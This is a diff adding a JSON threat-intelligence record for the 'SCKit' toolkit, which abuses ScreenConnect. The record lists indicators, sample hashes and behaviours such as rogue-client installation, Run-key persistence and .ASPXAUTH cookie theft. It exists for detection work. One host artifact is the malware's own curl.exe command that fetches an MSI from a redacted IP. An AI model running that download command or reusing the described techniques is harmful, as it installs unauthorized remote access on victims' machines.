@@ -1,0 +1,344 @@
+{
+  "malware_family": "SCKit",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "SCKit is a malicious toolkit that abuses legitimate ScreenConnect remote-support software. After initial deployment, it installs an unauthorized secondary client for remote access, establishes persistence via scheduled tasks and Run keys, and deploys the RelayTrap component to deliver payloads to connecting IT support technicians. The toolkit also includes components for stealing browser authentication cookies to hijack web sessions.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "cmd /c curl.exe -o C:\\Windows\\Temp\\sc.msi \"http://<redacted_ip>/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&h=<redacted_ip>&p=8041&s=2588ef5c15954b10&c=Exploited9\"",
+      "context": "Executed by ScreenConnect client to download secondary client installer.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\sc.msi",
+      "context": "Path for the downloaded secondary ScreenConnect client installer.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\RelayTrap",
+      "context": "Directory for persistence scripts.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\SCKitBundle",
+      "context": "Extraction path for the main toolkit ZIP archive.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "k[0-9a-f]{32}.ps1",
+      "context": "Pattern for temporary PowerShell scripts written to %TEMP%.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "RelayTrapLiteAlert",
+      "context": "Persistence value in the CurrentVersion\\Run key to launch alert script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": ".ASPXAUTH",
+      "context": "Cookie name targeted for browser session hijacking.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "network.mojom.NetworkService",
+      "context": "String in command line to identify browser network-service processes.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SCKIT_SELF",
+      "context": "Fallback environment variable to locate the launcher batch file.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "-Mode full",
+      "context": "Argument for the decoder script to perform full deployment.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "-PollSeconds 10",
+      "context": "Argument for the watcher script to set polling interval.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "-NoReArm",
+      "context": "Argument to prevent dropper redeployment during cleanup.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "c=Exploited",
+      "context": "Marker in client installer download URL parameter.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "TrapWatch",
+      "context": "String found in scheduled task events related to RelayTrap.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ToolboxRelayUploader.exe",
+      "context": "Utility for console-based payload distribution.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "RelayTrap.cs",
+      "context": "C# source code for the RelayTrap component.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "lab-context.json",
+      "context": "Configuration file used when staging the distribution helper.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "4096",
+      "context": "Number of PBKDF2 iterations used in bundle key derivation.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "ns.mo7sen.dev",
+      "context": "Decoder, bundle, script, and utility retrieval.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "sc.payproofkit.com",
+      "context": "Unauthorized ScreenConnect panel and installer source.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cdn007-digitaldownloads.com",
+      "context": "Campaign infrastructure; configured installer source.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "newnewnew.gotdns.org",
+      "context": "Associated ScreenConnect relay.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "soxnewwork.homedns.org",
+      "context": "Associated ScreenConnect relay.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.99.255.28",
+      "context": "Unauthorized ScreenConnect server and installer source.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "155.94.150.39",
+      "context": "Address associated with the unauthorized panel.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/Bin/ScreenConnect.ClientSetup.msi",
+      "context": "Path for downloading the secondary client installer.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/EadF.php",
+      "context": "Path for downloading the decoder and other components.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Lab-Half",
+      "context": "Response header containing material for the decryption key.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Lab-Salt",
+      "context": "Response header containing the salt for PBKDF2 key derivation.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "2588ef5c15954b10",
+      "context": "Client ID for unauthorized ScreenConnect client.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "ed630cc2c873b091",
+      "context": "Client ID for unauthorized ScreenConnect client.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "61a672a13f03a9e81f573535ee92b1ed6cb7e848a33a06048865312d4e185ae2",
+      "description": "sc.msi installer package"
+    },
+    {
+      "sha256": "8e6912deed82e80bb6bd66f73509d024b1f78b993515366d8317e69a97cff4f4",
+      "description": "Staged toolkit ZIP"
+    },
+    {
+      "sha256": "8cb5f48bbe70b5248db7f327f3d1ad6649df5c767d2a7e0711ee147fd92e06af",
+      "description": "ToolboxRelayUploader.exe"
+    },
+    {
+      "sha256": "3c7a98f0fdb6235b8076319c74dc1085f7b349b6d750416dd0cadb07d7972ec4",
+      "description": "RelayTrap.cs source"
+    },
+    {
+      "sha256": "d2ed7a7bf4f8ac9c7969e9b3a07ebd4dda0d858f372c876ac0a041611698de9a",
+      "description": "TrapWatch.ps1"
+    },
+    {
+      "sha256": "4a1dd3cd2ea14368afadf7e9dfdd63b104e3981ef8c85bbb6510919b810af04b",
+      "description": "trapkit\\install.ps1"
+    },
+    {
+      "sha256": "cf50d73fa8117a758093b1344de41cd6a6ccddc645cdda1fa91a9264efe93956",
+      "description": "Lite-Alert.ps1"
+    },
+    {
+      "sha256": "81cc2baa35b798d6084bd078662fa29ff28df02c46c6ccdb2b43bde97d19f781",
+      "description": "Stage0Loader.ps1"
+    },
+    {
+      "sha256": "7a9aca9fdd4dcc13fe497cabdb13ca1e5d6a529271c8aa495e5ca1c1c80271ec",
+      "description": "Panel-Lateral.ps1"
+    },
+    {
+      "sha256": "43b7a5e56f9e6c7b74e1ce2b7b5af63f383084625fcc2d3a5985fa1059e2db95",
+      "description": "Run-Lateral-Full.bat"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "dotnet"
+  ]
+}
